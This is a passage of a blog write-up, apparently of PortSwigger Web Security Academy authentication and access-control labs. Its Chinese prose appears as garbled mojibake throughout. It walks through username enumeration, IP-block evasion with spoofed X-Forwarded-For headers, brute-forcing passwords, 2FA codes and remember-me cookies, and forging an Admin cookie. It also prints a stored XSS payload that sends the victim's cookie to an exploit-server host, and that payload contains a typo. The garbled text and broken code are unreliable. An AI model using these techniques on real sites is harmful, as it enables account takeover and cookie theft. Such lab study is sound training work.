alt="image-20230116162932834"></p><p>ç„¶åæˆ‘ä»¬ä»¥è¿™ä¸ªåŒ¹é…è§„åˆ™è¿›è¡Œæ’åºï¼Œå‘ç°ç¬¬ä¸€ä¸ªçš„æœ«å°¾å°‘äº†ä¸ªç‚¹(.)ï¼Œäºæ˜¯æˆ‘ä»¬å°†å…¶é”å®šä¸ºå¯ç–‘æ•°æ®åŒ…</p><p><img src="/sake-s-blog/assets/image-20230116162828254-omCI7xSl.png" alt="image-20230116162828254"></p><p>ç„¶åæˆ‘ä»¬å°è¯•ä»¥appleä¸ºç”¨æˆ·åè¿›è¡Œå¯†ç çˆ†ç ´ï¼ŒæŒ‰Lengthæ’åºé”å®šç¬¬ä¸€ä¸ªå¯ç–‘æ•°æ®åŒ…</p><p><img src="/sake-s-blog/assets/image-20230116163912344-2TBWu2mQ.png" alt="image-20230116163912344"></p><p>å°è¯•ä»¥ç”¨æˆ·åappleï¼Œå¯†ç maggieç™»å½•ï¼Œç™»å½•æˆåŠŸ</p><p><img src="/sake-s-blog/assets/image-20230116164158236-BuGAXQ2z.png" alt="image-20230116164158236"></p><blockquote><p>è¡¥å……åˆ†æï¼š</p><ol><li>responseçš„é•¿çŸ­ä¸ä¸€ï¼Œæ— æ³•é€šè¿‡ç®€å•çš„Lengthæ’åºè¿›è¡Œåˆ¤æ–­ï¼Œè€Œåº”è¯¥ä½¿ç”¨Grepè®¾ç½®èµ·å§‹å­—ç¬¦ä¸²å’Œæœ«å°¾å­—ç¬¦ä¸²æ¥åŒ¹é…ç»“æœ</li><li>æœ¬Labå¯¹ç”¨æˆ·åå’Œå¯†ç é”™è¯¯é‡‡ç”¨äº†å‡ ä¹ç›¸åŒçš„å›æ˜¾ï¼Œä¸é€‚ç”¨ç®€å•çš„é€ä¸ªå­—æ®µçˆ†ç ´</li></ol></blockquote><h2 id="username-enumeration-via-response-timing" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-response-timing"><span>Username enumeration via response timing</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>è¿™ä¸ªå®éªŒå®¤å¾ˆå®¹æ˜“ä½¿ç”¨å“åº”æ—¶é—´è¿›è¡Œç”¨æˆ·åæšä¸¾ã€‚è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·æšä¸¾ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·åï¼Œå¼ºåˆ¶ä½¿ç”¨è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åè®¿é—®ä»–ä»¬çš„å¸æˆ·é¡µé¢ã€‚</p><ul><li><p>ä½ çš„è¯ä»¶ï¼šwiener:peter</p></li><li><p><a href="https://portswigger.net/web-security/authentication/auth-lab-usernames" target="_blank" rel="noopener noreferrer">å€™é€‰äººå <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></li><li><p><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords" target="_blank" rel="noopener noreferrer">å€™é€‰äººçš„å¯†ç <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></li></ul><p>æç¤ºï¼š ä¸ºäº†å¢åŠ æŒ‘æˆ˜ï¼Œå®éªŒå®¤è¿˜å®æ–½äº†ä¸€ç§åŸºäºIPçš„æš´åŠ›ä¿æŠ¤ã€‚ç„¶è€Œï¼Œè¿™å¯ä»¥é€šè¿‡æ“çºµHTTPè¯·æ±‚å¤´è½»æ¾ç»•è¿‡ã€‚</p></blockquote><p>æŠ“å–ç™»å½•çš„æ•°æ®åŒ…ï¼Œä½¿ç”¨intruderè¿›è¡Œç”¨æˆ·åçˆ†ç ´ï¼Œå°†å¯†ç è®¾ç½®ä¸ºå¾ˆé•¿ï¼Œä»¥å¢å¤§å»¶æ—¶ã€‚ä½¿ç”¨pitchforkï¼Œå¢åŠ XFFå¤´ç”¨æ¥ä¼ªé€ IP</p><p><img src="/sake-s-blog/assets/image-20230116170754861-DuhqBtGK.png" alt="image-20230116170754861"></p><p>ç„¶åæ‰“å¼€response receivedå’Œresponse completedåˆ—ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·åä¸ºaffiliatesæ—¶ï¼Œç›¸æ¯”å…¶ä»–å»¶æ—¶è¾ƒå¤§</p><p><img src="/sake-s-blog/assets/image-20230116171448917-CdnDvfhF.png" alt="image-20230116171448917"></p><p>åŒä¸Šæ–‡æåˆ°çš„å¯†ç çˆ†ç ´æ–¹æ³•å¯¹å¯†ç è¿›è¡Œçˆ†ç ´ï¼Œå®¹æ˜“å¾—å‡ºç”¨æˆ·åä¸ºaffiliatesï¼Œå¯†ç ä¸ºthomas</p><p><img src="/sake-s-blog/assets/image-20230116171724091-DF-wotLi.png" alt="image-20230116171724091"></p><p>æˆåŠŸç™»å½•å—å®³è€…ç”¨æˆ·</p><p><img src="/sake-s-blog/assets/image-20230116171902557-BGE8npjz.png" alt="image-20230116171902557"></p><blockquote><p>è¡¥å……åˆ†æï¼š</p><ul><li>Pitchforkç±»å‹æ˜¯å°†payloadéšç€è¯·æ±‚æ•°è€Œéå†ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªå­—å…¸çš„è¾“å…¥å€¼æ˜¯ä¸€ä¸€å¯¹åº”çš„</li><li>XFFå¤´æŒ‡çš„æ˜¯HTTPæŠ¥æ–‡æœ€åŸå§‹çš„IPåœ°å€ï¼Œé€šè¿‡ä¿®æ”¹XFFå¯ä»¥è¾¾åˆ°ä¼ªé€ IPçš„ä½œç”¨</li></ul></blockquote><h2 id="broken-brute-force-protection-ip-block" tabindex="-1"><a class="header-anchor" href="#broken-brute-force-protection-ip-block"><span>Broken brute-force protection, IP block</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>ç”±äºå¯†ç æš´åŠ›ä¿æŠ¤çš„é€»è¾‘ç¼ºé™·ï¼Œè¯¥å®éªŒå®¤æ˜“å—æ”»å‡»ã€‚ä¸ºäº†è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œæš´åŠ›ç ´è§£å—å®³è€…çš„å¯†ç ï¼Œç„¶åç™»å½•å¹¶è®¿é—®ä»–ä»¬çš„å¸æˆ·é¡µé¢ã€‚</p><ul><li>ä½ çš„è¯ä»¶ï¼šwiener:peter</li><li>å—å®³è€…ç”¨æˆ·åï¼šcarlos</li><li><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords" target="_blank" rel="noopener noreferrer">å€™é€‰äººçš„å¯†ç  <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>æŠ“å–ç™»å½•çš„æ•°æ®åŒ…ï¼Œä½¿ç”¨pitchforkè¿›è¡Œçˆ†ç ´</p><p><img src="/sake-s-blog/assets/image-20230116174416947-jbTLhSPZ.png" alt="image-20230116174416947"></p><p>ç”±äºæœ¬Labå¯¹ç”¨æˆ·ç™»å½•è¿ç»­å¤±è´¥æ¬¡æ•°è¿‡å¤šä¼šé”å®šIPï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é‡‡ç”¨æˆ‘ä»¬å·²çŸ¥<strong>æ­£ç¡®çš„ç”¨æˆ·å’Œå—å®³è€…ç”¨æˆ·äº¤æ›¿ç™»å½•</strong>çš„å½¢å¼ï¼Œåˆ¶ä½œå­—å…¸<img src="/sake-s-blog/assets/image-20230116174054412-BNhCG-Ja.png" alt="image-20230116174054412"></p><p>è®¾ç½®çº¿ç¨‹æ± æœ€å¤§è¯·æ±‚æ•°ä¸º1ï¼Œè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œå¹¶è®¾ç½®è¿‡æ»¤æ‰2xxçš„responseï¼Œå†æŒ‰Payloadæ’åºï¼Œå®¹æ˜“çœ‹åˆ°ç”¨æˆ·åä¸ºcarlosï¼Œå¯†ç ä¸ºjenniferä¹Ÿç™»å½•æˆåŠŸäº†</p><p><img src="/sake-s-blog/assets/image-20230116175647089-BimzebiP.png" alt="image-20230116175647089"></p><p><img src="/sake-s-blog/assets/image-20230116175351092-BHBnV4-4.png" alt="image-20230116175351092"></p><p><img src="/sake-s-blog/assets/image-20230116175829634-DwfCKUqW.png" alt="image-20230116175829634"></p><p>æˆåŠŸç™»å½•å—å®³è€…ç”¨æˆ·</p><p><img src="/sake-s-blog/assets/image-20230116175947791-C2b3AEoD.png" alt="image-20230116175947791"></p><h2 id="username-enumeration-via-account-lock" tabindex="-1"><a class="header-anchor" href="#username-enumeration-via-account-lock"><span>Username enumeration via account lock</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>æ­¤å®éªŒå®¤æ˜“å—ç”¨æˆ·åæšä¸¾æ”»å‡»ã€‚å®ƒä½¿ç”¨å¸æˆ·é”å®šï¼Œä½†è¿™åŒ…å«ä¸€ä¸ªé€»è¾‘ç¼ºé™·ã€‚è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·æšä¸¾ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·åï¼Œå¼ºåˆ¶ä½¿ç”¨è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åè®¿é—®ä»–ä»¬çš„å¸æˆ·é¡µé¢ã€‚</p><ul><li><a href="https://portswigger.net/web-security/authentication/auth-lab-usernames" target="_blank" rel="noopener noreferrer">å€™é€‰äººå <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords" target="_blank" rel="noopener noreferrer">å€™é€‰äººçš„å¯†ç  <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>æŠ“å–ç™»å½•æ•°æ®åŒ…ï¼Œä½¿ç”¨Cluster bombè¿›è¡Œçˆ†ç ´ï¼Œè¯¥æ¨¡å¼ä¸‹ä¼šå°†ä¸¤ä¸ªpayloadå®Œå…¨ç»„åˆ</p><p><img src="/sake-s-blog/assets/image-20230119153926662-9AZh2OYV.png" alt="image-20230119153926662"></p><p>ç¬¬ä¸€ä¸ªpayloadsè®¾ç½®ä¸ºå€™é€‰ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªpayloadsè®¾ç½®ä¸ºNullï¼Œé‡å¤æ¬¡æ•°è®¾ä¸º5</p><p><img src="/sake-s-blog/assets/image-20230119153826185-XRnjyYM4.png" alt="image-20230119153826185"></p><p><img src="/sake-s-blog/assets/image-20230119153832991-iXcy7Eem.png" alt="image-20230119153832991"></p><p>çˆ†ç ´å‡ºç»“æœåæŒ‰Lengthæ’åºï¼Œçœ‹åˆ°ç¬¬ä¸€æ¡çš„responseé‡Œæœ‰â€œYou have made too many incorrect login attempts. Please try again in 1 minute(s).â€œï¼Œæˆ‘ä»¬é”å®šè¿™ä¸ªç”¨æˆ·åaqï¼Œéšåæˆ‘ä»¬ç­‰å¾…ä¸€åˆ†é’Ÿ</p><p><img src="/sake-s-blog/assets/image-20230119154132529-D78zszQi.png" alt="image-20230119154132529"></p><p>æŒ‰ä¸Šæ–‡æåˆ°çš„çˆ†ç ´å¯†ç çš„æ–¹æ³•æŠŠå¯†ç çˆ†ç ´ä¸€éï¼Œå¾—å‡ºç”¨æˆ·åaqï¼Œå¯†ç batmanï¼ŒæˆåŠŸç™»å½•å—å®³è€…è´¦æˆ·<img src="/sake-s-blog/assets/image-20230119154934430-C44OcN7y.png" alt="image-20230119154934430"></p><p><img src="/sake-s-blog/assets/image-20230119154926616-Da2RedgH.png" alt="image-20230119154926616"></p><blockquote><p>è¡¥å……åˆ†æï¼šè¿™ä¸ªé¶åœºå¦‚æœå¤šæ¬¡è¯·æ±‚è´¦æˆ·å¹¶ä¸”è¾“å…¥å¯†ç ï¼Œä¼šå¯¼è‡´å‡ºç°è´¦æˆ·é”å®šçš„æƒ…å†µã€‚æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºåªæœ‰è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åï¼Œæ‰ä¼šå¯¼è‡´è´¦æˆ·é”å®šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ£€ç´¢å‡ºæ­£ç¡®çš„ç”¨æˆ·åè¿›è¡Œå°è¯•</p></blockquote><h2 id="_2fa-broken-logic" tabindex="-1"><a class="header-anchor" href="#_2fa-broken-logic"><span>2FA broken logic</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>è¿™ä¸ªå®éªŒå®¤çš„ä¸¤è¦ç´ è®¤è¯æ˜¯è„†å¼±çš„ï¼Œç”±äºå…¶æœ‰ç¼ºé™·çš„é€»è¾‘ã€‚ è¦è§£å†³çš„å®éªŒå®¤ï¼Œè®¿é—®carlosçš„å¸æˆ·çš„ç½‘é¡µã€‚</p><ul><li>ä½ å‡­æ®ï¼š <code>wiener:peter</code></li><li>å—å®³è€…çš„ç”¨æˆ·åï¼š <code>carlos</code></li></ul><p>ä½ è¿˜æœ‰çš„è®¿é—®çš„ç”µå­é‚®ä»¶æœåŠ¡å™¨æ”¶åˆ°ä½ çš„2FAéªŒè¯ç ã€‚</p></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>æŠ“å–æäº¤éªŒè¯ç çš„æ•°æ®åŒ…ï¼Œå°†cookieä¸­çš„verify=wieneræ”¹ä¸ºå—å®³è€…çš„verify=carlos</p><p><img src="/sake-s-blog/assets/image-20230121143659203-dSG139Yy.png" alt="image-20230121143659203"></p><p>ç„¶åå¯¹æäº¤çš„éªŒè¯ç è¿›è¡Œçˆ†ç ´ï¼ˆä»0000åˆ°9999ï¼‰ï¼Œå¯ä»¥ç”¨pythonç”Ÿæˆä¸ªéªŒè¯ç çˆ†ç ´å­—å…¸ï¼Œä¹Ÿå¯ä»¥è®¾ç½®payloadæ ¼å¼ä¸ºBrute forcerï¼Œå­—ç¬¦é›†è®¾ä¸º0123456789</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre class="language-python"><code><span class="line"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;out.txt&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;w&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token format-spec">04</span><span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token operator">+</span><span class="token string">&#39;\n&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="/sake-s-blog/assets/image-20230121150707727-B5kWlk-P.png" alt="image-20230121150707727"></p><p>ç»è¿‡ä¸€æ®µå¾ˆé•¿æ—¶é—´çš„çˆ†ç ´ï¼Œç„¶åçˆ†ç ´äº†å‡ éæ²¡çˆ†ç ´å‡ºæ¥ï¼ˆ</p><p><img src="/sake-s-blog/assets/image-20230121160340166-CmC-pdeC.png" alt="image-20230121160340166"></p><p><img src="/sake-s-blog/assets/image-20230121145748631-DTaBiNmL.png" alt="image-20230121145748631"></p><blockquote><p>æœªå®Œæˆ</p></blockquote><h2 id="brute-forcing-a-stay-logged-in-cookie" tabindex="-1"><a class="header-anchor" href="#brute-forcing-a-stay-logged-in-cookie"><span>Brute-forcing a stay-logged-in cookie</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>æ­¤å®éªŒå®¤å…è®¸ç”¨æˆ·åœ¨å…³é—­æµè§ˆå™¨ä¼šè¯åä»ä¿æŒç™»å½•çŠ¶æ€ã€‚ç”¨äºæä¾›æ­¤åŠŸèƒ½çš„ cookie å®¹æ˜“å—åˆ°æš´åŠ›ç ´è§£ã€‚ä¸ºäº†è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œæš´åŠ›ç ´è§£ Carlos çš„ cookie ä»¥è®¿é—®ä»–çš„â€œæˆ‘çš„å¸æˆ·â€é¡µé¢ã€‚</p><ul><li>æ‚¨çš„å‡­æ®ï¼š<code>wiener:peter</code></li><li>å—å®³è€…ç”¨æˆ·åï¼š<code>carlos</code></li><li><a href="https://portswigger.net/web-security/authentication/auth-lab-passwords" target="_blank" rel="noopener noreferrer">å€™é€‰äººçš„å¯†ç  <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>æŠ“å–ç™»å½•ä¿æŒçš„æ•°æ®åŒ…ï¼Œåˆ†æstay-logged-inå­—æ®µï¼Œæ ¹æ®ç»“æ„æˆ‘ä»¬çŒœæµ‹è¯¥å­—æ®µç»è¿‡base64ç¼–ç ï¼Œå°è¯•è§£ç </p><p><img src="/sake-s-blog/assets/image-20230121161558805-Dgv6L0py.png" alt="image-20230121161558805"></p><p><img src="/sake-s-blog/assets/image-20230121161048427-Cz0jOTWl.png" alt="image-20230121161048427"></p><p>è§£ç åï¼Œç”¨æˆ·ååé¢çš„å¯†ç éƒ¨åˆ†ä¹Ÿä¸éš¾çœ‹å‡ºæ˜¯ç”¨MD5åŠ å¯†</p><p><img src="/sake-s-blog/assets/image-20230121161239866-CGlq0aqV.png" alt="image-20230121161239866"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬åˆ†æå‡ºäº†stay-logged-inå­—æ®µçš„ç»“æ„ä¸ºï¼šbase64_encode(username:md5(password))ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payloadè¿›è¡Œçˆ†ç ´</p><p><img src="/sake-s-blog/assets/image-20230121162611579-oK8247sW.png" alt="image-20230121162611579"></p><p><img src="/sake-s-blog/assets/image-20230121162556918-DBE3BkqC.png" alt="image-20230121162556918"></p><p>çˆ†ç ´æˆåŠŸï¼Œè¿™é‡Œæˆ‘ä»¬æ ¹æ®responseçš„Set-cookieæ¥ç™»å½•å—å®³è€…ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥å°†å‘é€çš„è¯·æ±‚è§£ç å†è§£å¯†ï¼Œå¾—å‡ºå¯†ç ä¸ºaaaaaa</p><p><img src="/sake-s-blog/assets/image-20230121162853063-olyMHLr_.png" alt="image-20230121162853063"></p><p><img src="/sake-s-blog/assets/image-20230121162844545-DltxD9MI.png" alt="image-20230121162844545"></p><p>æˆåŠŸç™»å½•å—å®³è€…ç”¨æˆ·</p><p><img src="/sake-s-blog/assets/image-20230121163004976-Yfwn-Ok4.png" alt="image-20230121163004976"></p><blockquote><p>è¡¥å……åˆ†æï¼šç†Ÿæ‚‰å¸¸è§ç¼–ç ä»¥åŠåŠ å¯†æ–¹å¼</p></blockquote><h2 id="offline-password-cracking" tabindex="-1"><a class="header-anchor" href="#offline-password-cracking"><span>Offline password cracking</span></a></h2><p>é¶åœºè¦æ±‚ï¼š</p><blockquote><p>è¿™ä¸ªå®éªŒå®¤å­˜å‚¨ç”¨æˆ·çš„å¯†æ•£åˆ—åœ¨ä¸€ä¸ªé¥¼å¹²ã€‚ å®éªŒå®¤è¿˜åŒ…å«ä¸€ä¸ªXSSè„†å¼±æ€§è¯„è®ºçš„åŠŸèƒ½ã€‚ è¦è§£å†³çš„å®éªŒå®¤ï¼Œè·å¾—å¡æ´›æ–¯çš„ <code>stay-logged-in</code> é¥¼å¹²å¹¶ç”¨å®ƒæ¥ç ´è§£äº†ä»–å¯†ç ã€‚ ç„¶åï¼Œç™»å½•åœ¨ <code>carlos</code> å’Œåˆ é™¤ä»–çš„è´¦æˆ·ä»&quot;æˆ‘çš„å¸æˆ·&quot;ç½‘é¡µã€‚</p><ul><li>ä½ å‡­æ®ï¼š <code>wiener:peter</code></li><li>å—å®³è€…çš„ç”¨æˆ·åï¼š <code>carlos</code></li></ul></blockquote><p>å®éªŒæ­¥éª¤ï¼š</p><p>ç™»å½•åéšä¾¿è¿›ä¸€ç¯‡æ–‡ç« ï¼Œåœ¨ç•™è¨€æ¿æ’å…¥å‚¨å­˜å‹XSSï¼š<code>&lt;script&gt;documnet.location=&#39;https://exploit-0a2b00e3039cfa87c05e44870157005d.exploit-server.net&#39;+document.cookie&lt;/script&gt;</code></p><p><img src="/sake-s-blog/assets/image-20230121165608772-Ime65w28.png" alt="image-20230121165608772"></p><h2 id="-6" tabindex="-1"><a class="header-anchor" href="#-6"><span>------------------------------</span></a></h2><h1 id="è¶Šæƒ" tabindex="-1"><a class="header-anchor" href="#è¶Šæƒ"><span>è¶Šæƒ</span></a></h1><p><img src="/sake-s-blog/assets/image-20230121231859194-DfG4XlfB.png" alt="image-20230121231859194"></p><blockquote><p>è®¿é—®æ§åˆ¶ï¼ˆæˆ–æˆæƒï¼‰æ˜¯å¯¹è°ï¼ˆæˆ–ä»€ä¹ˆï¼‰å¯ä»¥æ‰§è¡Œå°è¯•çš„æ“ä½œæˆ–è®¿é—®ä»–ä»¬è¯·æ±‚çš„èµ„æºçš„çº¦æŸçš„åº”ç”¨ã€‚åœ¨webåº”ç”¨ç¨‹åºçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè®¿é—®æ§åˆ¶å–å†³äºèº«ä»½éªŒè¯å’Œä¼šè¯ç®¡ç†ï¼š</p><ul><li><p>èº«ä»½éªŒè¯å¯è¯†åˆ«ç”¨æˆ·å¹¶ç¡®è®¤ä»–ä»¬æ˜¯ä»–ä»¬æ‰€è¯´çš„äººã€‚</p></li><li><p>ä¼šè¯ç®¡ç†æ ‡è¯†åŒä¸€ç”¨æˆ·æ­£åœ¨å‘å‡ºå“ªäº›åç»­HTTPè¯·æ±‚ã€‚</p></li><li><p>è®¿é—®æ§åˆ¶ç¡®å®šæ˜¯å¦å…è®¸ç”¨æˆ·æ‰§è¡Œä»–ä»¬è¯•å›¾æ‰§è¡Œçš„æ“ä½œã€‚</p></li></ul><p>ç ´åçš„è®¿é—®æ§åˆ¶æ˜¯ä¸€ä¸ªå¸¸è§çš„ã€é€šå¸¸æ˜¯å…³é”®çš„å®‰å…¨æ¼æ´ã€‚è®¿é—®æ§åˆ¶çš„è®¾è®¡å’Œç®¡ç†æ˜¯ä¸€ä¸ªå¤æ‚è€ŒåŠ¨æ€çš„é—®é¢˜ï¼Œå®ƒå°†ä¸šåŠ¡ã€ç»„ç»‡å’Œæ³•å¾‹çº¦æŸåº”ç”¨äºæŠ€æœ¯å®ç°ã€‚è®¿é—®æ§åˆ¶è®¾è®¡å†³ç­–å¿…é¡»ç”±äººç±»è€ŒéæŠ€æœ¯åšå‡ºï¼Œå¹¶ä¸”é”™è¯¯çš„å¯èƒ½æ€§å¾ˆé«˜ã€‚</p></blockquote><h2 id="unprotected-admin-functionality" tabindex="-1"><a class="header-anchor" href="#unprotected-admin-functionality"><span>Unprotected admin functionality</span></a></h2><blockquote><p>è¿™ä¸ªå®éªŒå®¤æœ‰ä¸€ä¸ªä¸å—ä¿æŠ¤çš„ç®¡ç†é¢æ¿ã€‚é€šè¿‡åˆ é™¤ç”¨æˆ·carlosæ¥è§£å†³å®éªŒå®¤é—®é¢˜ã€‚</p></blockquote><p>robotsæ•°æ®æ³„éœ²ï¼Œè®¿é—®/robots.txt</p><p><img src="/sake-s-blog/assets/image-20230121232448970-Drj8wMEs.png" alt="image-20230121232448970"></p><p>å†è®¿é—®/administrator-panelï¼Œç›´æ¥å‚ç›´è¶Šæƒï¼Œåˆ é™¤ç”¨æˆ·carlos</p><p><img src="/sake-s-blog/assets/image-20230121232548653-D9kd3aMd.png" alt="image-20230121232548653"></p><h2 id="unprotected-admin-functionality-with-unpredictable-url" tabindex="-1"><a class="header-anchor" href="#unprotected-admin-functionality-with-unpredictable-url"><span>Unprotected admin functionality with unpredictable URL</span></a></h2><blockquote><p>è¿™ä¸ªå®éªŒå®¤æœ‰ä¸€ä¸ªä¸å—ä¿æŠ¤çš„ç®¡ç†é¢æ¿ã€‚å®ƒä½äºä¸€ä¸ªä¸å¯é¢„æµ‹çš„ä½ç½®ï¼Œä½†è¯¥ä½ç½®åœ¨åº”ç”¨ç¨‹åºä¸­çš„æŸä¸ªä½ç½®è¢«å…¬å¼€ã€‚ é€šè¿‡è®¿é—®ç®¡ç†é¢æ¿å¹¶ä½¿ç”¨å®ƒåˆ é™¤ç”¨æˆ·carlosæ¥è§£å†³å®éªŒå®¤é—®é¢˜ã€‚</p></blockquote><p>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œè®¿é—®/admin-0ijqimï¼Œåˆ é™¤ç”¨æˆ·carlos</p><p><img src="/sake-s-blog/assets/image-20230121232746116-CSaDfPQM.png" alt="image-20230121232746116"></p><p><img src="/sake-s-blog/assets/image-20230121232838128-BhIKciHz.png" alt="image-20230121232838128"></p><h2 id="user-role-controlled-by-request-parameter" tabindex="-1"><a class="header-anchor" href="#user-role-controlled-by-request-parameter"><span>User role controlled by request parameter</span></a></h2><blockquote><p>è¿™ä¸ªå®éªŒå®¤æœ‰ä¸€ä¸ªä½äº/adminçš„ç®¡ç†é¢æ¿ï¼Œç”¨äºè¯†åˆ«ä½¿ç”¨å¯ä¼ªé€ cookieçš„ç®¡ç†å‘˜ã€‚ é€šè¿‡è®¿é—®ç®¡ç†é¢æ¿å¹¶ä½¿ç”¨å®ƒåˆ é™¤ç”¨æˆ·carlosæ¥è§£å†³å®éªŒå®¤é—®é¢˜ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼šwiener:peter</p></blockquote><p>ç™»å½•è´¦æˆ·ï¼Œä¿®æ”¹cookieï¼Œå°†Admin=falseæ”¹ä¸ºAdmin=true</p><p><img src="/sake-s-blog/assets/image-20230121233216467-BuazAm8V.png" alt="image-20230121233216467"></p><p>éšåè®¿é—®/adminï¼Œåˆ é™¤ç”¨æˆ·carlos</p><p><img src="/sake-s-blog/assets/image-20230121233351378-C3gCBAvE.png" alt="image-20230121233351378"></p><h2 id="user-role-can-be-modified-in-user-profile" tabindex="-1"><a class="header-anchor" 